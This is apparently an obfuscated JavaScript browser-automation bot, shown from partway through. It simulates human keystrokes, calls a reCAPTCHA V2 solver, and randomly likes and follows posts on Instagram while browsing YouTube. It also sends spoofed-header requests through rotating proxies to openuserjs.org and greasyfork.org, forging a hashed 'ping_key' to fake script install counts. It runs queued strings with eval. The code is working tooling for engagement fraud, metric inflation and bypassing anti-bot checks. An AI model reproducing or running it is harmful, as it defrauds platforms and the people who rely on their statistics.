                case 'stype':
                  {
                    const a9 = a2['shift']();
                    Check['nes'](a9);
                    const aa = a2['shift']();
                    Check['ia'](aa, Page, Frame);
                    const ab = a2['shift']();
                    Check['nes'](ab),
                    isValidPruneArray(a2) || warn('[WATCHDOG]' + '\x20pruning\x20t' + 'echniques\x20' + 'failed\x20in\x20' + 'stype:', ab, aa, a9, a2),
                    log('[debug]\x20in' + '\x20to\x20find:', aa, ab, ...a2);
                    const ac = await I(aa, ab, ...a2);
                    log('[debug]\x20fo' + 'und\x20elemen' + 't', ac),
                    await J(Z, ac, a9, 0x1 * 0x25d2 + 0xb3 * -0x13 + -0x1888);
                  }
                  break;
                case 'solveV2':
                  {
                    const ad = a2[0x1044 * 0x2 + -0x1 * -0x1ebc + -0x2 * 0x1fa2];
                    Check['ia'](ad, Page, Frame),
                    await Z['solveRecap' + 'tchaV2'](ad);
                  }
                  break;
                case 'sclick':
                  {
                    const ae = a2['shift'](),
                      af = a2['shift']();
                    (ae instanceof Page || ae instanceof Frame) && 'string' == typeof af && isValidPruneArray(a2) || warn('[WATCHDOG]' + '\x20arg\x20check' + '\x20failed\x20in' + '\x20sclick:', a2),
                    await K(Z, [
                      'stype',
                      '_click',
                      ae,
                      af,
                      ...a2
                    ]);
                  }
                  break;
                case 'sclick-nav':
                  {
                    const [ag] = a2;
                    Check['ia'](ag, Page, Frame);
                    const ah = ag['waitForNav' + 'igation']();
                    await K(Z, [
                      'sclick',
                      ...a2
                    ]),
                    await ah;
                  }
                  break;
                case 'view':
                  {
                    const ai = a2['shift'](),
                      aj = a2['shift']();
                    (ai instanceof Page || ai instanceof Frame) && 'string' == typeof aj && isValidPruneArray(a2) || warn('[WATCHDOG]' + '\x20arg\x20check' + '\x20failed\x20in' + '\x20view:', a2),
                    await K(Z, [
                      'stype',
                      '_view',
                      ai,
                      aj,
                      ...a2
                    ]);
                  }
                  break;
                case 'randomdown':
                  {
                    let [ak, al] = a2;
                    Check['num'](ak),
                    Check['num'](al),
                    al ? ? = -0x2502 + 0x2 * -0x1231 + 0x4964 + 0.3;
                    for (let am = ak; am-- && (await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('ArrowDown'), !(random() <= al));)
                      await H();
                  }
                  break;
                case 'enter-nav':
                  {
                    const [an] = a2;
                    Check['ia'](an, Page, Frame);
                    const ao = an['waitForNav' + 'igation']();
                    await K(Z, 'enter'),
                    await ao;
                  }
                  break;
                case 'click':
                  {
                    const [ap, aq, ar] = a2;
                    if ('string' != typeof ap || ![
                        'boolean',
                        'string'
                      ]['includes'](typeof aq) || !(ar instanceof Page || ar instanceof Frame))
                      return void warn('[WATCHDOG]' + '\x20Failed\x20ar' + 'gument\x20che' + 'ck', a2);
                    await Z['clickSelec' + 'tor'](ap, aq, ar);
                  }
                  break;
                case 'ifclick':
                  {
                    const [as, au, av] = a2;
                    'string' == typeof as && [
                      'boolean',
                      'string'
                    ]['includes'](au) && (av instanceof Page || av instanceof Frame) || warn('[WATCHDOG]' + '\x20Failed\x20ar' + 'gument\x20che' + 'ck', a2);
                    let aw = await av['$'](as);
                    aw && await Z['clickSelec' + 'tor'](as, au, av);
                    try {
                      aw ? .['dispose'] ? .();
                    } catch (ax) {}
                  }
                  break;
                default:
                  warn('No\x20action\x20' + 'found\x20for\x20' + a1[-0x4f * -0x46 + 0x3a9 * 0x8 + -0x32e2]);
              }
            } else {
              const ay = a1['split'](',\x20');
              await H(), flags['debug'] && log('[DEBUG]\x20Ex' + 'ecuting\x20sc' + 'riptlet\x20ty' + 'pe:', ay);
              let az = 0xc4e + -0x2 * 0xdee + 0xf8e;
              for (let aA of ay) {
                switch (flags['debug'] && log('[SNIP' + az++ + (']\x20Executin' + 'g\x20step:\x20[') + aA + ']'), aA) {
                  case 'j':
                    await H();
                    break;
                  case 'tab':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Tab');
                    break;
                  case 'enter':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Enter');
                    break;
                  case 'down':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('ArrowDown');
                    break;
                  case 'up':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('ArrowUp');
                    break;
                  case 'space':
                    await Z['fakeUserAc' + 'tion'][aN(0x0, 'Q40e') + 'dPress']('Space');
                    break;
                  case 'esc':
                  case 'escape':
                    await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dPress']('Escape');
                    break;
                  default:
                    warn('[WATCHDOG]' + '\x20Failed\x20cm' + 'd\x20catch', aA, ay);
                }
                await H();
              }
            }
          return 0xc * 0x1f3 + -0x25b8 + 0xe55;
        }
        async function L(Z) {
          return Check['inst'](Z, Page), await Z['keyboard']['down']('ArrowDown'), await wait(getRandomInt(0x2137 + -0x1213 + -0x15 * 0x9c, -0x1a35 + -0xe3 * 0x13 + 0x359a)), await Z['keyboard']['up']('ArrowDown'), await wait(getRandomInt(0x8 * 0x2e + -0x1ddb + 0x2053, 0x153 + 0x2 * 0x229 + 0xbef)), -0x15ca + 0x1b8c + -0x5c1;
        }
        let M = 0x140d + 0x17fa + -0x3 * 0xead;

        function N(Z = 'none') {
          return 'sadjqwdwkq' + 'dwqxzc' + sha1(++M + ('sadjqwdwkq' + 'dwq') + Z);
        }
        async function O(Z, a0) {
          Check['func'](Z), Check['inst'](a0, Page);
          const a1 = N();
          await a0['evaluate'](a2 => {
            let a3 = [...document['querySelec' + 'torAll']('svg')]['find'](a4 => a4['innerHTML']['includes']('<title>Lik' + 'e</title>') && 'Like' === a4['getAttribu' + 'te']('aria-label') && window['__toolkit']['smartEleme' + 'ntVisible'](a4));
            a3 && a3['classList']['add'](a2);
          }, a1), await Z(a0['browser'](), [
            'ifclick',
            '.' + a1, -0xd * -0x55 + 0x174c + -0x24d * 0xc,
            a0
          ]);
        }
        async function P(Z, a0) {
          const a1 = N();
          await a0['evaluate'](a2 => {
            let a3 = [...document['querySelec' + 'torAll']('div')]['find'](a5 => 'Follow' === a5['innerText'] && window['__toolkit']['smartEleme' + 'ntVisible'](a5)),
              a4 = a3['className']['baseVal'];
            a3['className']['baseVal'] += ('' === a4 ? '' : '\x20') + a2;
          }, a1), await Z(a0['browser'](), [
            'ifclick',
            '.' + a1, -0xbd5 + 0x157f + -0x9a9,
            a0
          ]);
        }
        async function Q(Z) {
          await Z['goto']('https://ww' + 'w.instagra' + 'm.com/', gotoOpts), await Z['waitForFun' + 'ction'](() => {
            try {
              return document['querySelec' + 'torAll']('article')['length'] > 0x2 * 0x71 + 0x1 * 0x2281 + 0x2362 * -0x1;
            } catch (a0) {
              return -0x1 * -0x214 + -0x1483 + 0x1 * 0x126f;
            }
          });
        }
        async function R(Z) {
          await Z['keyboard']['down']('ArrowDown'), await wait(getRandomInt(-0x7a6 * 0x1 + 0x11 * 0xb3 + -0x1e5, -0x28d * -0xb + -0x1 * 0x1da5 + 0xc22)), await Z['keyboard']['up']('ArrowDown'), await wait(getRandomInt(-0xa * 0x2f2 + -0x12c4 + 0x1160 * 0x3, -0x1 * 0x1aad + -0xf03 + 0x3b44 * 0x1)), getRandomInt(0x26d1 + -0x65c + -0x2074, -0x80 * -0x3c + 0xd8c * -0x1 + -0x835 * 0x2) <= -0x163e + 0x248 * -0x2 + 0x1ad5 && await O(K, Z), getRandomInt(0x2469 * -0x1 + -0x11f3 * -0x1 + -0x1d * -0xa3, 0xe2b + 0xdea + -0x1bb1) <= 0x8c0 + -0x21cb * 0x1 + -0x24a * -0xb && await P(K, Z);
        }
        async function S(Z) {
          return await Z['evaluate'](() => {
            window['__toolkit'] = {
              'isElementVisible' (a0) {
                try {
                  return null !== a0['offsetPare' + 'nt'];
                } catch (a1) {
                  return 0x1a87 * -0x1 + 0xdfb * 0x1 + -0x1 * -0xc8c;
                }
              },
              'smartElementVisible' (a0) {
                try {
                  if (!a0 || !a0['getClientR' + 'ects']()['length'])
                    return -0xf * 0x102 + -0x58 * 0x24 + 0x1b7e;
                  const a1 = getComputedStyle(a0);
                  if ('none' === a1['display'] || 'hidden' === a1['visibility'] || '0' === a1['opacity'])
                    return -0x53 * -0x6b + -0x1e9e + -0x413;
                  const a2 = a0['getBoundin' + 'gClientRec' + 't']();
                  return a2['top'] >= 0x1ceb + -0x41f * -0x5 + -0x3186 * 0x1 && a2['left'] >= -0x1e37 + -0x1599 + -0x19e8 * -0x2 && a2['bottom'] <= (window['innerHeigh' + 't'] || document['documentEl' + 'ement']['clientHeig' + 'ht']) && a2['right'] <= (window['innerWidth'] || document['documentEl' + 'ement']['clientWidt' + 'h']) ? -0x1eb8 + -0x93e + 0x27f7 : -0x2a7 + -0x269d + 0x2944;
                } catch (a3) {
                  return -0x1f79 + 0x13 * -0xad + 0x2c50;
                }
              },
              'extractLinks' (a0) {
                const a1 = /<a\s+(?:[^>]*?\s+)?href="([^"]*)"/gi;
                let a2, a3 = [];
                for (; null !== (a2 = a1['exec'](a0));)
                  a2['index'] === a1['lastIndex'] && a1['lastIndex']++, a2['forEach']((a4, a5) => {
                    0x200 * 0x5 + 0x2505 + -0x2f04 === a5 && a3['push'](a4);
                  });
                return a3;
              }
            };
          });
        }
        log('browser\x20la' + 'unched');
        let T = 0xb + 0x1 * -0x218d + 0x2182 * 0x1;
        const U = V['length'],
          V = [
            async function() {
              const Z = await x('https://ww' + 'w.youtube.' + 'com/');
              let a0 = 0xc31 + 0x21fc + -0x2e2d;
              if (await Z['goto'](data['mediumArti' + 'cles']['random'](), {
                  'timeout': NETWORK_PATIENCE
                })['catch'](a1 => a0++), !a0) {
                await randomWait();
                for (let a1 = -0x1154 + 0xc56 + 0x9 * 0x8e; a1 < getRandomInt(0x15 * 0xb6 + 0x1338 + 0x1 * -0x2225, -0x172a * 0x1 + 0x7ef + 0x3d * 0x40); a1++)
                  await q['simKeyboar' + 'dPress']('ArrowDown'), await randomWait();
                await randomWait(), await wait(-0x18ddb + -0x15ac0 + 0x3d2fb), await Z['close']();
              }
            },
            async function() {
              const Z = await x('https://ww' + 'w.youtube.' + 'com/');
              let a0 = 0x13 * 0x29 + 0x279 * 0x1 + -0x584;
              const a1 = getRandomInt(0x16a + -0x176c + 0x1607, -0x317 * 0xb + -0x1145 * -0x1 + 0x10c5);
              for (; a0 < a1;) {
                try {
                  await y(Z), await G['random']()(Z);
                } catch (a2) {
                  log(a2), await Z['goto']('https://ww' + 'w.youtube.' + 'com/');
                }
                a0++;
              }
              return await Z['close'](), 0xd9e + 0x96b * -0x3 + 0xea4;
            }
          ];
        for (;;) {
          try {
            const Z = f['length'] ? f['shift']() : V[T++ % U];
            'string' == typeof Z ? g = await eval(Z) : await Z();
          } catch (a0) {}
          await wait(0x4 * 0x845 + 0x185f + -0x358b);
        }
      }
      if (flags['doCreateSe' + 'rver'] && require('http')['createServ' + 'er'](async function(a1, a2) {
          '/latestev' === a1['url'] ? (a2['writeHead'](0x1f * -0x139 + 0xb26 + 0x1b89), a2['end']('$' === g ? g : '$' + g)) : (a2['writeHead'](0x203a + 0x1af * 0x14 + -0x411e), a2['write']('v0.8'), a2['end']());
        })['listen'](process['env']['PORT'] || -0x1b35 * 0x1 + 0x3391 + 0x734), flags['doOUJS']) {
        const a1 = 'https://op' + 'enuserjs.o' + 'rg/';

        function a2(a5, a6 = -0x263f + -0x2 * 0x1387 + 0x4d4e) {
          const aO = d;
          if (a5[aO(0x18)]('Firefox'))
            return a5['slice'](a5['indexOf']('Firefox') + 'Firefox' ['length'] + (0x1 * -0x1a17 + 0x1839 + -0x1df * -0x1));
          const a7 = a5['indexOf']('Chrome/') + 'Chrome/' ['length'],
            a8 = a5['slice'](a7),
            a9 = a8['slice'](-0x1cf2 + 0xf * -0x22e + 0x3c * 0x107, a8['indexOf']('\x20'));
          return a6 ? a9['slice'](0x767 * 0x5 + 0x3 * 0x251 + 0x15fb * -0x2, a9['indexOf']('.')) : a9;
        }

        function a3() {
          const a5 = data['oujsUAs']['random']();
          return [
            a5,
            a5['includes']('Firefox')
          ];
        }
        async function a4() {
          const a5 = data['oujsToAssi' + 'st']['random'](),
            a6 = a5['replace']('/scripts/', '/install/') + '.user.js',
            [a7, a8] = a3(),
            a9 = a2(a7),
            aa = {
              'signal': AbortSignal['timeout'](0x2f54 + -0x951 + 0x10d),
              'headers': {
                'host': 'openuserjs' + '.org',
                'origin': 'https://op' + 'enuserjs.o' + 'rg',
                'user-agent': a7,
                'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
                'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
                'accept-language': 'en-US,en;q' + '=0.9',
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origi' + 'n',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1'
              },
              'body': null,
              'method': 'GET'
            };
          a8 ? Object['assign'](aa['headers'], {
            'te': 'trailers'
          }) : Object['assign'](aa['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + a9 + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          });
          const ab = await fetch(a1, aa)['catch'](ae => {});
          if (!ab || !ab['headers'])
            return;
          if (null === ab['headers']['get']('X-RateLimi' + 't-Limit'))
            return;
          const ac = {
            'signal': AbortSignal['timeout'](0x8 * 0x6b1 + -0x1a25 + 0x3d * 0x31),
            'headers': {
              'host': 'openuserjs' + '.org',
              'origin': 'https://op' + 'enuserjs.o' + 'rg',
              'user-agent': a7,
              'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
              'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'no-cache',
              'pragma': 'no-cache',
              'referer': a1,
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origi' + 'n',
              'sec-fetch-user': '?1',
              'upgrade-insecure-requests': '1'
            },
            'body': null,
            'method': 'GET'
          };
          if (a8 ? Object['assign'](ac['headers'], {
              'te': 'trailers'
            }) : Object['assign'](ac['headers'], {
              'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + a9 + '\x22',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-platform': '\x22Windows\x22'
            }), !await fetch(a5, ac)['catch'](ae => {}))
            return;
          const ad = {
            'headers': {
              'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
              'pragma': 'no-cache',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'none'
            },
            'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
            'body': null,
            'method': 'GET'
          };
          a8 ? Object['assign'](ad['headers'], {
            'te': 'trailers'
          }) : Object['assign'](ad['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + a9 + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          }), await fetch(a6, ad);
        }
        a4();
        for (let a5 = -0xaa * 0x2f + 0xd47 * 0x1 + 0x1 * 0x11ef; a5 < 0x171 + 0x1baf * -0x1 + 0x1 * 0x1a42; a5++)
          setTimeout(a4, (0x17bcf + -0x12f3e + 0x9dcf) * a5 * getRandomInt(-0x199e * 0x1 + -0x1eb1 + 0x3850, -0x3 * -0x609 + 0x2463 + -0x367b));
        setInterval(() => {
          a4();
          for (let a6 = 0x14bf + -0x1 * -0xeda + -0x2bd * 0xd; a6 < 0x3 * 0x89a + 0x4f * 0x3b + -0x2bff; a6++)
            setTimeout(a4, (0x4387 + 0x6 * -0x3ff6 + -0x1 * -0x2269d) * a6 * getRandomInt(0x68 * -0x1c + -0x1a3e + 0x259f, 0xb3 * 0x2b + -0x661 + -0x17ad));
        }, -0x11040b + 0x115 * -0x450f + 0x92abc6);
      }
      if (flags['doGF']) {
        async function a6(a8 = null, a9 = -0x2de + 0x1 * 0x1297 + -0xfb9) {
          const aP = d,
            aa = makeFetchCookie(fetch),
            ab = a8 ? new HttpsProxyAgent(a8) : a8,
            ac = await aa('https://gr' + 'easyfork.o' + 'rg/en', {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site'
              },
              'method': 'GET',
              'mode': 'cors',
              'agent': ab
            }),
            ad = extractLinks(await ac[aP(0x2)]())['filter'](al => al['includes']('by-site'))['slice'](-0x36c + 0x35 * -0x8e + 0x20d2, -(-0x36 * -0x79 + -0x2436 * -0x1 + -0x1 * 0x3dbb)),
            ae = a9 && data['scriptTarg' + 'ets']['random'](),
            af = a9 ? ae['preRef'] : ad['random'](),
            ag = await aa(af, {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origi' + 'n',
                'Sec-Fetch-User': '?1'
              },
              'referrer': 'https://gr' + 'easyfork.o' + 'rg/en',
              'method': 'GET',
              'mode': 'cors',
              'agent': ab
            }),
            ah = extractLinks(await ag['text']())['filter'](al => al['includes']('/scripts/') && !al['includes']('by-site'))['slice'](0x265 * -0xa + -0x5f + 0xb * 0x236),
            ai = a9 ? ae['url'] : ah['random'](),
            aj = await aa(ai, {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,*/*;' + 'q=0.8',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origi' + 'n',
                'Sec-Fetch-User': '?1'
              },
              'referrer': af,
              'method': 'GET',
              'mode': 'cors',
              'agent': ab
            }),
            ak = extractAnchorData(await aj['text']());
          if (ak['pingUrl']) {
            const al = sha1(ak['ipAddress'] + ak['scriptId'] + ak['pingKey']),
              am = ak['pingUrl'] + (ak['pingUrl']['includes']('?') ? '&' : '?') + 'ping_key=' + encodeURIComponent(al);
            await aa('https://gr' + 'easyfork.o' + 'rg' + am + '&mo=3', {
              'credentials': 'include',
              'headers': {
                'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '20.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '20.0',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q' + '=0.5',
                'Prefer': 'safe',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origi' + 'n'
              },
              'referrer': ai,
              'method': 'POST',
              'mode': 'cors',
              'agent': ab
            });
          } else
            warn('awdiwajdwj' + 'qdqw');
        }
        async function a7() {
          const a8 = await getRandomProxy();
          await a6(a8, -0x224d + 0x5 * 0x155 + 0x4 * 0x6e9), random() <= 0x10f * -0x13 + -0x20 * -0x12a + 0x1123 * -0x1 + 0.6 && await a6(a8, -0x1a9e + 0xc * -0x251 + -0x1 * -0x366b);
        }
        a7();
        for (let a8 = 0xf81 + -0xa7 * -0x2 + 0x10cf * -0x1; a8 < -0x15b0 * 0x1 + -0x209f + 0x3653; a8++)
          setTimeout(a7, (-0x7b85 + -0x109ce + -0x26fb3 * -0x1) * a8 * getRandomInt(-0x1 * 0x5ff + -0x1c24 + 0x2224, 0xc75 + 0x611 * -0x1 + -0x661 * 0x1));
        setInterval(() => {
          a7();
          for (let a9 = 0x130b + -0x943 + 0x139 * -0x8; a9 < 0x1f32 + -0xb * 0xda + -0x15d0; a9++)
            setTimeout(a7, (0x1a * 0xc47 + 0x15083 + -0x1a559) * a9 * getRandomInt(-0x5e7 + 0x1 * -0x17eb + 0x1dd3, 0x1 * -0xcf7 + 0x1e * 0x107 + -0x476 * 0x4));
        }, 0x2 * -0xe3bea1 + -0x2c12593 + 0x6092855);
      }
    } catch (a9) {
      warn(a9);
    }
    break;
  }
}();